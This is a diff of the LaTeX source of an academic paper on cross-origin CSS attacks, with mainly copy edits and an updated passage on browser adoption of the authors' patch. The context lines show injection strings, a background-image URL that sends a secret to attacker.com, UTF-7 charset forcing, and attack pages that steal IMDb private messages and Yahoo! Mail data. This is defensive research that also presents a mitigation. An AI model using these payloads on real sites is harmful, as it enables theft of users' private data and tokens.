@@ -267,7 +267,7 @@ In a cross-origin CSS attack, the attacker's main objective is to steal the vict
 \subsubsection{CSS String Injection}
 One might expect that a non-CSS document would contain numerous syntax errors would fail to parse as a valid style sheet. However, due to the error-tolerant CSS parsing behavior described in Section~\ref{sec:lax}, portions of a non-CSS document with valid CSS syntax can still be successfully parsed and recognized as style sheet rules. Thus, it is sufficient for the attacker to inject strings into the target document that will form a valid style rule. In practice, there are several methods that may allow a web attacker to inject strings into the target domain, e.g. reflection of user-controlled strings in URL parameters. 
 
-We illustrate an example of CSS string injection in Figure~\ref{figure:injection}. Suppose that there is a sensitive content, represented with the string ``SECRET'', in an HTML document on an honest web site that the attacker wants to steal. Assuming that the attacker has sufficient influence over the web page to control the text preceding and succeeding the secret string, the CSS string injection can be constructed based on common CSS properties that have string type values, i.e. \texttt{font-family}, \texttt{background-image}, and \texttt{list-style-image}. Given the ability to inject arbitrary strings into the target domain, the HTML document can be crafted to contain a CSS property \texttt{font-family} as the following:
+We illustrate an example of CSS string injection in Figure~\ref{figure:injection}. Suppose that there is a sensitive content, represented with the string ``SECRET'', in an HTML document on an honest web site that the attacker wants to steal. Assuming that the attacker has sufficient influence over the web page to control the text preceding and succeeding the secret string, the CSS string injection can be constructed based on common CSS properties that have string type values, i.e. \texttt{font-family}, \texttt{background-image}, and \texttt{list-style-image}. Given the ability to inject arbitrary strings into the target domain, the HTML document can be crafted to contain a CSS property \texttt{font-family} as follows:
 \begin{itemize}
 \item CSS property opening string: \verb|{}BODY{font-family:"|
 \item CSS property termination string: \verb|"}|
@@ -317,7 +317,7 @@ Methods&IE&FF&Opera&Safari&Chrome\\ \hline
 After extracting the sensitive content hidden in the style properties, the attacker may send the secret data to his own evil servers or even mount CSRF attacks. There are various well-known methods for the attacker's web page to send information back to the attacker without any user interaction. For example, the attacker could use JavaScript to send data through an HTML hidden form or through the \texttt{XMLHttpRequest} API.
 
 \paragraph{Without JavaScript}
-Another method is available to exploit users that have disabled JavaScript in their browsers. This might occur if the user has installed the popular NoScript security tool~\cite{noscript}. The attacker can extract data without using JavaScript by injecting the CSS \texttt{background-image} property string as the following:
+Another method is available to exploit users that have disabled JavaScript in their browsers. This might occur if the user has installed the popular NoScript security tool~\cite{noscript}. The attacker can extract data without using JavaScript by injecting the CSS \texttt{background-image} property string as follows:
 \begin{verbatim}
 <HTML>..{} BODY { background-image: url(http://att
 acker.com/?SECRET); }..</HTML>
@@ -334,12 +334,12 @@ The first and most crucial step of the cross-origin CSS attack is to contain the
 In the CSS specification~\cite{css}, strings can either be written with double quotes or with single quotes. Double quotes cannot occur inside double quotes, and the same applies for single quotes. Therefore, the attacker has the choice to inject either single or double quotes depending on the occurrence of quotes in the secret data. In a context where both quotes are escaped, it becomes more difficult to inject a CSS string. However, a variation of the attackcan bypass this restriction by injecting the CSS property \texttt{background-image}. For the \texttt{background-image} property, the URL value is written with the functional notation \texttt{url()}, which does not require the use of single or double quotes around the URL string itself. The CSS specification does define that certain characters must be escaped in an unquoted URL, e.g. parentheses, commas, white spaces, single quotes and double quotes. However, in Internet Explorer, the CSS parser does not require any of these characters to be escaped in an unquoted URL and will parse until it encounters a closing parentheses and a semicolon.
 
 \paragraph{Forcing UTF-7}
-The requirement for quotes not to get escaped can sometimes be bypassed in browsers that support UTF-7 encoding, including Firefox and Safari. If the target web sites fails to specify a character set in the HTTP Content-Type header, the attacker's evil page can force the remote resource to be parsed as UTF-7 encoding as the following:
+The requirement for quotes not to get escaped can sometimes be bypassed in browsers that support UTF-7 encoding, including Firefox and Safari. If the target web sites fails to specify a character set in the HTTP Content-Type header, the attacker's evil page can force the remote resource to be parsed as UTF-7 encoding:
 \begin{verbatim}
 <LINK REL="stylesheet" HREF="http://target.com"
 CHARSET="utf-7">
 \end{verbatim}
-By forcing UTF7, either a single or double quote may be injected by rendering it in the UTF-7 character set, i.e. ``\texttt{+ACc-}'' for single quote and ``\texttt{+ACI-}'' for double quote. This will cause the injection to survive any output escaping of the web application. A significant number of web sites actually do not specify character sets in their HTTP responses; we found that 22 out of the top 100 web sites ranked by Alexa~\cite{alexa} did not specify character sets via HTTP header. Some web sites specify the Content-Type information using meta tags with the \texttt{http-equiv} attribute in the HTML head element as the following:
+By forcing UTF7, either a single or double quote may be injected by rendering it in the UTF-7 character set, i.e. ``\texttt{+ACc-}'' for single quote and ``\texttt{+ACI-}'' for double quote. This will cause the injection to survive any output escaping of the web application. A significant number of web sites actually do not specify character sets in their HTTP responses; we found that 22 out of the top 100 web sites ranked by Alexa~\cite{alexa} did not specify character sets via HTTP header. Some web sites specify the Content-Type information using meta tags with the \texttt{http-equiv} attribute in the HTML head element:
 \begin{verbatim}
 <META HTTP-EQUIV="Content-Type" CONTENT="text/html;
 charset=utf-8">
@@ -352,14 +352,14 @@ In CSS, a string cannot directly contain a newline. To include a newline in a st
 The CSS parser in the Internet Explorer accepts both newlines in CSS strings and newlines in unquoted URL strings, regardless of whether they are escaped or not. This behavior makes attacks significantly easier to construct in Internet Explorer.
 
 \subsection{Example Attacks}
-In this section, we present several examples of the cross-origin CSS attack on popular web sites with the Internet Explorer browser. First we describe an attack on a popular movie database web site to steal private messages of registered users. Then we describe using e-mail subject string injection on popular web mail applications to steal the subjects of received e-mails and even secret CSRF tokens.
+In this section, we present several examples of cross-origin CSS attacks on popular web sites with the Internet Explorer browser. First we describe an attack on a popular movie database web site to steal private messages of registered users. Then, we describe using e-mail subject string injection on popular web mail applications to steal the subjects of received e-mails and even secret CSRF tokens.
 
 \paragraph{IMDb} IMDb is a popular online database of movies and related information, which allows users to rate films and make posts on message boards. Some of the features for a registered account include adding users to their friends list and sending private messages to other users. Targeting the user's private messaging page, the attacker can mount an attack on the victim's inbox and steal the subject and body of all preceding private messages with the following steps:
 \begin{enumerate}
 \item{The attacker sends an evil private message to the victim's account with a CSS property opening string in the subject, such as ``\texttt{\{\}body\{font-family:'}''.}
 \item{The victim visits \texttt{attacker.com}, which triggers the cross-origin CSS attack and steals content from the victim's private messaging inbox.}
 \end{enumerate}
-We chose to use single quotes for CSS property injection to avoid string termination due to the existance of double quotes in the page source. The attacker's evil page references the URL of victim's private messaging page as a CSS resource and extracts the stolen data from the computed \texttt{font-family} style using JavaScript, as the following:
+We chose to use single quotes for CSS property injection to avoid string termination due to the existing double quotes in the page source. The attacker's evil page references the URL of victim's private messaging page as a CSS resource and extracts the stolen data from the computed \texttt{font-family} style using JavaScript:
 \begin{verbatim}
 <HTML>
 <HEAD>
@@ -375,7 +375,7 @@ alert(document.body.currentStyle['fontFamily']);
 </BODY>
 </HTML>
 \end{verbatim}
-Note that the target URL contains the victim's user number ``ur12345678'', which is public and can be simply fetched from any user profile link on the message board. In this example, a single injection point is sufficient due to the highly propable existance of the termination string. Such a vulnerability may be widespread on many low security sites.
+Note that the target URL contains the victim's user number ``ur12345678'', which is public and can be simply fetched from any user profile link on the message board. In this example, a single injection point is sufficient due to the highly probable existence of the termination string. Such a vulnerability may be widespread on many low security sites.
 
 \paragraph{Yahoo! Mail} Yahoo! Mail is a free web mail service that lets users send and receive e-mails using any popular web browser with cookies and JavaScript enabled. After a user signs in with a valid account, the web site will authenticate the user with browser session cookies for as long as two weeks without signing out. Targeting the web mail home page, the attacker can mount an attack on victims that are signed into their accounts with the following steps:
 \begin{enumerate}
@@ -384,7 +384,7 @@ Note that the target URL contains the victim's user number ``ur12345678'', which
 \item{The attacker sends another evil e-mail to the victim's account with a CSS property opening string in the subject, such as ``\texttt{\{\}body\{background-image:url(}''.}
 \item{The victim visits \texttt{attacker.com}, which triggers the cross-origin CSS attack and steals secret data from the victim's inbox.}
 \end{enumerate}
-The attacker's evil page references the URL of web mail home page as a CSS resource and extracts the stolen data from the computed \texttt{background-image} style using JavaScript, as the following:
+The attacker's evil page references the URL of web mail home page as a CSS resource and extracts the stolen data from the computed \texttt{background-image} style using JavaScript:
 \begin{verbatim}
 <HTML>
 <HEAD>
@@ -494,7 +494,7 @@ In our observations, the conservative approach would not break a single CSS refe
 Due to practical limitations of our automated scanning, all of the tested links were unauthenticated. It is possible that more sites will be broken after logging in.
 
 \subsubsection{Adoption}
-Our proposal has been adopted by several major browsers, including Google Chrome, Opera, Safari and Firefox. Our proposal requires no changes to existing web servers and only modifies the browser. We implemented the conservative approach of stricter cross-origin CSS loading in a patch to WebKit, the open source web browser engine component integrated in Safari and Google Chrome. The WebKit patch was first deployed in Google Chrome 4.0.249.78, and also accepted in Safari 4.0.5. Note that the cross-origin CSS raw text leak is tightened by this patch because read access to cross-origin CSS raw text is limited to well-formed imports. Inspired by our WebKit patch, the exact same heuristic was adopted in Opera 10.10. Mozilla adopted the strict approach for loading cross-origin CSS files in Firefox 3.7.
+Our proposals have been adopted by several major browsers, including Google Chrome, Opera, Safari and Firefox. Our proposal requires no changes to existing web servers and only modifies the browser. We implemented the conservative approach of stricter cross-origin CSS loading in a patch to WebKit, the open source web browser engine component integrated in Safari and Google Chrome. The WebKit patch was first deployed in Google Chrome 4.0.249.78, and also accepted in Safari 4.0.5. Note that the cross-origin CSS raw text leak is tightened by this patch because read access to cross-origin CSS raw text is limited to well-formed imports. Inspired by our WebKit patch, the exact same heuristic was adopted in Opera 10.10. We implemented the strict approach for loading cross-origin CSS files in Mozilla Firefox. Mozilla has deployed our patch in alpha builds of Firefox 3.7.
 
 The interpretation of valid MIME types for cross-origin CSS on each browser slightly differs as shown in Table~\ref{table:adoption}. All browsers allow the correct \texttt{text/css} MIME type, Firefox and WebKit-based browsers also defaultly accept files with empty string or \texttt{application/x-unknown-content-type}\linebreak MIME type, which are normally used to trigger the browser's content-sniffing algorithm. We noticed that Firefox 3.7 allows some unknown MIME types such as \texttt{*/*} and also bogus MIME types that lack a slash such as \texttt{text}. Known MIME types represent all the predefined MIME types for common media types with the exception of \texttt{text/css}, such as \texttt{text/html} and \texttt{image/gif}.
 
